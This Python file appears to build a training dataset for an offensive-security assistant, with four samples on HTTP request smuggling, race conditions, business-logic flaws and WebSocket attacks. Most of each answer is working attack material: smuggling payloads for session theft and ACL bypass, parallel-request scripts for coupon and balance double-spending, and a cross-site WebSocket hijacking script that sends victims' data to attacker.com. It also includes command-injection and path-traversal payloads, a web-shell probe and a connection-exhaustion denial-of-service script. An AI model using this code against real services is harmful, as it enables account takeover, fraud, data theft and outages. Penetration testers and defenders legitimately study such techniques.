#!/usr/bin/env python3
"""
Network and protocol-level attack dataset:
HTTP Request Smuggling, WebSocket attacks, race conditions, and business logic flaws.
"""

from generate_dataset import Sample

NETWORK_PROTOCOL_SAMPLES = [
    # ── HTTP Request Smuggling ───────────────────────────────
    Sample(
        instruction="Explain HTTP request smuggling and how to exploit CL.TE and TE.CL variants.",
        input="Target: Application behind a load balancer, Burp Suite available",
        output="""## HTTP Request Smuggling

Request smuggling exploits discrepancies between how a front-end (proxy/load balancer)
and back-end server parse HTTP/1.1 request boundaries.

### Core Concept

HTTP/1.1 allows two methods to specify body length:
- `Content-Length` (CL): exact byte count
- `Transfer-Encoding: chunked` (TE): body in chunks, terminated by `0\\r\\n\\r\\n`

When front-end and back-end disagree on which header takes precedence → smuggling.

### CL.TE (Front-end uses CL, Back-end uses TE)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end reads 13 bytes (the chunked body `0\r\n\r\n` + `SMUGGLED`).
Back-end processes chunked: `0\r\n\r\n` = end of chunks, but `SMUGGLED` remains buffered.

**Confirming CL.TE via timeout:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
If the request times out → back-end is waiting for the next chunk starting with `X` → CL.TE confirmed.

### TE.CL (Front-end uses TE, Back-end uses CL)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

Front-end processes chunked: reads `8` bytes (`SMUGGLED`) then `0\r\n\r\n` = done.
Back-end reads CL=3 bytes (`8\r\n`), leaving `SMUGGLED\r\n0\r\n\r\n` buffered.

### TE.TE (Both support TE, obfuscate one)

```http
Transfer-Encoding: chunked
Transfer-Encoding: cow

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
```

Cause one server to ignore the header while the other processes it.

### Exploit 1: Poison Subsequent Requests (Response Queue Poisoning)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 57
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Foo: x
```

Next innocent user's request gets appended to `Foo: x` header, causing:
- Their request to be routed to `/admin`
- OR their response to be the admin page

### Exploit 2: Capture Victim's Request (Session Theft)

```http
POST / HTTP/1.1
Content-Length: 296
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=ATTACKER_SESSION

csrf=TOKEN&postId=1&name=attacker&comment=
```

The next victim's request (including their Cookie header!) is appended to `comment=` field.
Attacker reads the comment → gets victim's session cookie.

**Content-Length in smuggled request must be LARGER than actual injected content.**

### Exploit 3: Bypass Security Controls

```http
POST / HTTP/1.1
Content-Length: 80
Transfer-Encoding: chunked

0

GET /internal-admin HTTP/1.1
Host: localhost
X-Internal: true

```

If front-end blocks direct access to `/internal-admin` but back-end trusts `Host: localhost`
→ smuggled request bypasses the front-end ACL.

### Detection

```bash
# Burp Suite Pro: HTTP Request Smuggler extension (automatic)
# Enable: Extender → BApp Store → HTTP Request Smuggler

# Manual timing test:
# Send CL.TE probe:
python3 -c "
import socket, ssl, time

payload = b'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX'
s = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
conn = ctx.wrap_socket(s, server_hostname='target.com')

start = time.time()
conn.sendall(payload)
conn.recv(4096)
elapsed = time.time() - start
print(f'Response time: {elapsed:.1f}s')
# > 10 seconds → back-end is waiting → smuggling possible
"

# smuggler.py (automated)
python3 smuggler.py -u https://target.com/ -l 3 -t 10
```

### HTTP/2 Downgrade Smuggling (H2.CL / H2.TE)

```http
:method POST
:path /
:authority target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com
```
When HTTP/2 is downgraded to HTTP/1.1 by the back-end, injected headers survive.
""",
        category="network",
        subcategory="http_smuggling",
    ),
    # ── Race Conditions ──────────────────────────────────────
    Sample(
        instruction="How do you exploit race conditions in web applications? Cover limit bypass, double-spend, and TOCTOU flaws.",
        input="Target: E-commerce application, coupon codes and gift card balance features",
        output="""## Race Condition Exploitation

Race conditions occur when a system's behavior depends on the sequence of events,
and an attacker can manipulate timing to reach an unexpected state.

### Type 1: Limit Bypass (One-Time Use Bypass)

```python
# Target: promo code can only be used once per account
# Vulnerable code:
def apply_promo(user_id, code):
    if db.query("SELECT used FROM promos WHERE code=?", code).used:
        return "Already used"
    # Race window is here ↑
    db.execute("UPDATE promos SET used=1 WHERE code=?", code)
    db.execute("UPDATE users SET balance=balance+50 WHERE id=?", user_id)
    return "Applied!"
```

**Parallel request attack:**
```python
import asyncio, aiohttp

async def apply_promo(session, code):
    return await session.post(
        'https://target.com/api/promo',
        json={'code': code, 'action': 'apply'}
    )

async def race():
    async with aiohttp.ClientSession(headers={
        'Cookie': 'session=VICTIM_SESSION',
    }) as session:
        # Send 20 requests simultaneously
        tasks = [apply_promo(session, 'PROMO10') for _ in range(20)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(await r.json())

asyncio.run(race())
```

**Result:** Multiple requests hit the check before any update → coupon applied N times.

### Type 2: Double-Spend (Gift Card / Balance)

```python
# Vulnerable fund transfer:
def transfer(from_id, to_id, amount):
    balance = get_balance(from_id)  # Read
    if balance >= amount:           # Check
        # Time window between check and write!
        deduct(from_id, amount)     # Write
        credit(to_id, amount)
```

**Attack:**
```bash
# Burp Suite: send 10 requests simultaneously using Turbo Intruder
# burp_script:
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
        requestsPerConnection=1,
        pipeline=False
    )
    for i in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')  # Release all simultaneously

def handleResponse(req, interesting):
    table.add(req)
```

### Type 3: TOCTOU — File Upload Race

```python
# Vulnerable image upload + scan:
def upload(file):
    save_to_disk(file)           # Temp location
    if virus_scan(temp_path):    # Race window!
        move_to_web_root(temp_path)  # Moved after scan
    else:
        delete(temp_path)
```

**Attack:**
```bash
# While upload is being scanned, race to access temp file:
# Thread 1: Upload file → scan in progress
# Thread 2: Rapidly access /tmp/upload_xyz.php before move/delete

for i in $(seq 1 100); do
    curl -s https://target.com/tmp/upload_abc.php?cmd=id &
done
wait
```

### Type 4: Registration Race → Duplicate Username

```python
# Vulnerable:
def register(username, password):
    if user_exists(username):   # Check
        return "Username taken"
    create_user(username, password)  # Create (race here!)
```

**Attack: Two accounts with same username**
```python
# Register two accounts with username='admin' simultaneously
# One may bypass the check → duplicate admin account exists
# Or: two accounts exist with same username → confusion in auth logic
```

### Type 5: Password Reset Token Race

```python
# Vulnerable: new reset token invalidates old → but race window exists
def reset_password(token, new_password):
    user = get_user_by_token(token)
    update_password(user.id, new_password)
    invalidate_token(token)  # Token still valid until here
```

**Attack:**
```python
# Step 1: Request password reset → get token
# Step 2: Send 50 reset requests simultaneously with same token
# Some succeed despite single-use intent
```

### Tooling

```bash
# Burp Turbo Intruder (most precise)
# Resource: https://portswigger.net/research/turbo-intruder-stretching-the-limits-of-web-race-conditions

# Python asyncio approach (custom)
# aiohttp for HTTP/1.1
# httpx for HTTP/2 (better connection reuse)

# Automated race condition scanner
python3 racepwn.py --url https://target.com/api/promo \
    --method POST \
    --data '{"code":"PROMO10"}' \
    --threads 20 \
    --cookie "session=TOKEN"
```

### HTTP/2 Single-Packet Attack

All requests in one TCP segment → eliminates network jitter:
```python
import httpx

requests_data = [
    {'method': 'POST', 'url': '/api/promo',
     'json': {'code': 'PROMO10'}}
] * 20

with httpx.Client(http2=True, base_url='https://target.com',
                  headers={'Cookie': 'session=TOKEN'}) as client:
    # Using HTTP/2 multiplexing for simultaneous requests
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor() as ex:
        futures = [ex.submit(client.post, '/api/promo', json={'code':'PROMO10'})
                   for _ in range(20)]
        results = [f.result() for f in futures]
```
""",
        category="network",
        subcategory="race_conditions",
    ),
    # ── Business Logic Flaws ─────────────────────────────────
    Sample(
        instruction="Describe common business logic vulnerabilities and how to systematically identify them in web applications.",
        input="Target: Multi-tenant SaaS application with subscription tiers",
        output="""## Business Logic Vulnerability Assessment

Business logic flaws are application-specific vulnerabilities that arise from incorrect
assumptions about how users will interact with features.

### Category 1: Privilege Escalation via Feature Abuse

**Horizontal privilege escalation (IDOR):**
```bash
# Change user ID in API request to access other users' data
GET /api/users/1234/documents        # My documents
GET /api/users/1235/documents        # Another user's documents
PATCH /api/users/1235/profile        # Modify another user's profile

# IDOR in indirect references
GET /api/export?report_id=uuid-xxxx  # My report
# Enumerate UUIDs (sequential, time-based, or via GraphQL introspection)
```

**Vertical privilege escalation via parameter tampering:**
```bash
POST /api/upgrade-plan
{"plan": "pro"}
# → Try:
{"plan": "enterprise"}
{"plan": "admin"}
{"role": "administrator", "plan": "pro"}
```

### Category 2: Price Manipulation

```bash
# Negative quantity
POST /api/cart
{"product_id": 123, "quantity": -5, "price": 99.99}
# → Credit applied to account

# Price parameter tampering
POST /api/checkout
{"items": [{"id": 1, "price": 0.01}]}  # Original price was $99.99

# Currency/decimal manipulation
{"amount": "9.9e1"}   # 9.9 * 10^1 = 99 vs 9.9?
{"amount": "0x63"}    # Hex: 99?

# Integer overflow
{"quantity": 2147483648}  # INT_MAX + 1 → negative
```

### Category 3: Workflow Bypass

```bash
# Skip steps in multi-step process
# Normal flow: /step1 → /step2 → /step3 → /confirm
# Skip to: /confirm directly

# Skip payment in checkout
POST /api/orders/complete
{"order_id": 999, "status": "paid"}  # Without going through payment

# Skip email verification
POST /api/activate
{"user_id": 123, "verified": true}  # Directly set verified

# Skip 2FA
# After entering password, directly request:
GET /api/dashboard  # With session from step 1 only
```

### Category 4: Rate Limiting and Enumeration

```bash
# Username/email enumeration via timing or response differences
# Timing attack:
for user in users_to_test.txt; do
    time curl -s -X POST https://target.com/login \
        -d "username=$user&password=wrong"
done
# Existing users: bcrypt comparison = slow
# Non-existing users: early return = fast

# Account enumeration via password reset
POST /api/forgot-password
{"email": "exists@target.com"}    # "Reset email sent"
{"email": "noexist@target.com"}   # "Email not found" ← different response!
```

### Category 5: Multi-Tenancy Isolation Failures

```bash
# Cross-tenant data access
GET /api/v1/data?org_id=OTHER_ORG_ID
# Should return 403, if returns data → tenant isolation failure

# API key/token leakage across tenants
# Create webhook in Org A pointing to Org B's data endpoint
# Org B's data is delivered to Org A's webhook

# Shared resource naming collision
PUT /api/v1/buckets/shared-name   # Two orgs create bucket with same name
# First one wins, second silently overwrites or accesses first's data
```

### Category 6: Time-Based Logic Flaws

```bash
# Apply discount before expiry check is enforced
# Step 1: Add item to cart with valid discount → cart saved
# Step 2: Discount expires
# Step 3: Complete checkout → is expired discount still applied?

# Free trial extension
# Step 1: Create account → 14-day trial starts
# Step 2: On day 13, change account email
# Step 3: Does trial reset?

# Pre-purchase of future stock
# Purchase item that doesn't exist yet (ID from a leak/prediction)
```

### Category 7: File Upload Logic Abuse

```bash
# Race condition between upload and processing (see race conditions section)

# Extension bypass:
file.php.jpg   # Double extension
file.php%00.jpg  # Null byte (PHP < 5.3)
file.PHP       # Case sensitivity on Linux? (typically not, but check config)
.htaccess      # Upload to configure directory
file.svg       # SVG with embedded JS/SSRF

# Content-Type vs Extension mismatch:
curl -F "file=@shell.php;type=image/png" https://target.com/upload
```

### Systematic Testing Methodology

```
1. MAP all features and user roles
   - Draw state diagrams for multi-step workflows
   - Document assumed user roles (free, paid, admin, etc.)

2. TEST each assumption:
   - Can free users access paid features by direct URL?
   - Can step 3 be reached without completing step 1-2?
   - Can user A's resources be accessed by user B?

3. FUZZ all numeric and state parameters:
   - Negative values, zero, MAX_INT, floats, hex, scientific notation
   - Boolean: 0/1, true/false, "true", "1", null

4. ABUSE workflows out of order:
   - Skip steps, repeat steps, parallelize steps (race conditions)

5. CHAIN findings:
   - Combine enumeration → brute force → privilege escalation
```
""",
        category="network",
        subcategory="business_logic",
    ),
    # ── WebSocket Security ───────────────────────────────────
    Sample(
        instruction="How do you test WebSocket connections for security vulnerabilities including injection and hijacking?",
        input="Target: Real-time collaboration app using WebSocket for live updates",
        output="""## WebSocket Security Testing

WebSockets maintain persistent bidirectional connections — they bypass many
traditional HTTP security controls.

### Connection Interception with Burp Suite

1. Enable WebSocket interception: Proxy → Options → Intercept WebSocket
2. WebSocket history: Proxy → WebSocket history tab
3. Repeater supports WebSocket: Send message → observe response

### Vulnerability 1: Cross-Site WebSocket Hijacking (CSWSH)

If WebSocket handshake doesn't validate `Origin` header:
```javascript
// Attacker's page (any origin):
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
    // WebSocket is established WITH victim's cookies (browsers send them automatically!)
    ws.send(JSON.stringify({type: 'get_all_messages'}));
};
ws.onmessage = (e) => {
    fetch('https://attacker.com/steal?d=' + encodeURIComponent(e.data));
};
```

**Detection:**
```bash
# Test if non-allowed origin is accepted:
curl -i -N \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Version: 13" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Origin: https://attacker.com" \
    -H "Cookie: session=VICTIM_SESSION" \
    https://target.com/ws
# HTTP 101 → CSWSH possible!
```

### Vulnerability 2: Injection via WebSocket Messages

Most injection types work via WebSocket if the server processes message content:

**SQL injection:**
```python
import websocket, json

ws = websocket.WebSocket()
ws.connect("wss://target.com/ws",
           header=["Cookie: session=TOKEN"])

# Inject SQL into message field
ws.send(json.dumps({
    "type": "search",
    "query": "' OR '1'='1",
    "room_id": "1"
}))
print(ws.recv())
```

**SSTI via WebSocket:**
```python
ws.send(json.dumps({
    "type": "render_template",
    "template": "{{7*7}}"
}))
# If response contains '49' → SSTI
```

**Command Injection:**
```python
ws.send(json.dumps({
    "type": "ping",
    "host": "127.0.0.1; id"
}))
```

### Vulnerability 3: Authorization Issues

```python
# WebSocket connections may not re-check authorization after initial handshake
# Test: connect as low-priv user, then send admin-only messages

ws.connect("wss://target.com/ws", header=["Cookie: session=LOW_PRIV_SESSION"])

# Try admin operations:
ws.send(json.dumps({"type": "admin:listUsers"}))
ws.send(json.dumps({"type": "admin:deleteUser", "user_id": 123}))

# Subscribe to other users' channels:
ws.send(json.dumps({"type": "subscribe", "channel": "user:OTHER_USER_ID"}))
```

### Vulnerability 4: Message Manipulation / Replay

```python
# WebSocket messages often don't have CSRF tokens or message IDs
# Replay captured messages:
captured = '{"type":"transfer","amount":100,"to":"attacker_id"}'
ws.send(captured)  # Replay transfer operation
ws.send(captured)  # Multiple times → double-spend?
```

### Vulnerability 5: Denial of Service

```python
# Large message flood
ws.connect("wss://target.com/ws", header=["Cookie: session=TOKEN"])
large_payload = "A" * 1000000  # 1MB message
for i in range(100):
    ws.send(large_payload)

# Connection exhaustion (many slow connections)
import socket, ssl, threading
def slow_ws():
    s = ssl.create_default_context().wrap_socket(
        socket.create_connection(('target.com', 443)),
        server_hostname='target.com'
    )
    # Send WebSocket handshake but never send messages
    s.send(b"GET /ws HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\n...")
    time.sleep(3600)  # Hold connection open

for _ in range(100):
    threading.Thread(target=slow_ws).start()
```

### Automated WebSocket Fuzzing

```bash
# wscat for manual testing
wscat -c wss://target.com/ws --header "Cookie: session=TOKEN"

# WebSocket fuzzing with wsfuzz
python3 wsfuzz.py --url wss://target.com/ws \
    --payload '{"type":"FUZZ","data":"FUZZ"}' \
    --wordlist /usr/share/seclists/Fuzzing/

# Burp Suite Pro: use Active Scan on WebSocket connections

# Custom Python fuzzer:
payloads = [
    "' OR 1=1--",
    "{{7*7}}",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "; ls -la",
    '{"$gt": ""}',
]
for p in payloads:
    ws.send(json.dumps({"data": p, "type": "process"}))
    resp = ws.recv()
    print(f"Payload: {p[:30]} → {resp[:100]}")
```
""",
        category="network",
        subcategory="websocket_attacks",
    ),
]
